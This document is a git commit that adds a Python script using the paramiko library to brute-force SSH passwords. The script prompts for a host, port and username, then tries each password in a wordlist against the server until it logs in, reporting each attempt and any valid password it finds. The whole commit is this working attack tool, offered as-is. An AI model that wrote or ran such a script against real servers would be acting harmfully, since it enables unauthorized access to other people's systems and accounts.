f1573d6195db672f27f4c1e2cbf48ab3a47fa7be
Trojan hax <124779020+Trojanhax@users.noreply.github.com>
2024-04-21 13:00:09 +0530

    Create ssh_pass_brute_force.py

---
+++ ssh_pass_brute_force.py
@@ -0,0 +1,25 @@
+import paramiko
+
+host = input('Enter the host: ')
+port = input('Enter the port (default is 22): ') or 22
+username = input('Enter the username: ')
+
+attempts = 0
+
+with open("ssh-common-password.txt") as password_list:
+    for password in password_list:
+        password = password.strip("\n")
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            print("[{}] Attempting password: {}".format(attempts, password))
+            ssh.connect(host, port, username, password, timeout=1)
+            print("[>] Valid password found: {}".format(password))
+            ssh.close()
+            break
+        except paramiko.ssh_exception.AuthenticationException:
+            print("[!] Invalid password!")
+            attempts += 1
+        except Exception as e:
+            print("[!] An error occurred:", str(e))
+            ssh.close()
